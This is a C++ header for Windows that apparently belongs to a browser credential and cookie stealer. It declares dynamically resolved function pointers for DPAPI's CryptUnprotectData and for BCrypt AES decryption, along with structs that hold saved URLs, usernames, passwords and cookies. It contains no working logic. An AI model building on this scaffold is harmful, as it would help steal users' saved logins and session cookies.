#pragma once

#include <string>
#include <vector>
#include <Windows.h>
#include <shlobj.h>

using String = std::string;
template<class T>
using List = std::vector<T>;


#pragma region WINAPI_FUNCS 
typedef NTSTATUS(__stdcall *pBCryptDecrypt)(
	BCRYPT_KEY_HANDLE hKey,
	PUCHAR pbInput,
	ULONG cbInput,
	void *pPaddingInfo,
	PUCHAR pbIV,
	ULONG cbIV,
	PUCHAR pbOutput,
	ULONG cbOutput,
	ULONG *pcbResult,
	ULONG dwFlags
);
typedef BOOL (__stdcall *pCryptUnprotectData)(
	DATA_BLOB *pDataIn,
	LPWSTR *ppszDataDescr,
	DATA_BLOB *pOptionalEntropy,
	PVOID pvReserved,
	CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,
	DWORD dwFlags,
	DATA_BLOB *pDataOut
);
typedef NTSTATUS (__stdcall *pBCryptOpenAlgorithmProvider)(
	BCRYPT_ALG_HANDLE *phAlgorithm,
	LPCWSTR pszAlgId,
	LPCWSTR pszImplementation,
	ULONG dwFlags
);
typedef NTSTATUS (__stdcall *pBCryptSetProperty)(
	BCRYPT_HANDLE hObject,
	LPCWSTR pszProperty,
	PUCHAR pbInput,
	ULONG cbInput,
	ULONG dwFlags
);
typedef NTSTATUS (__stdcall *pBCryptGenerateSymmetricKey)(
	BCRYPT_ALG_HANDLE hAlgorithm,
	BCRYPT_KEY_HANDLE *phKey,
	PUCHAR pbKeyObject,
	ULONG cbKeyObject,
	PUCHAR pbSecret,
	ULONG cbSecret,
	ULONG dwFlags
);

//regex
//using f_RegOpenKeyEx = decltype(RegOpenKeyEx);
//using f_RegQueryValueEx = decltype(RegQueryValueEx);
//using f_RegQueryInfoKey = decltype(RegQueryInfoKey);
//using f_RegEnumKeyEx = decltype(RegEnumKeyEx);
//using f_RegCloseKey = decltype(RegCloseKey);
#pragma endregion



struct AccountData
{
	String Url;
	String Username;
	String Password;
};


struct CookieData
{
	String HostKey;
	String Name;
	String Value;
	String Path;
	String ExpireUTC;	
};
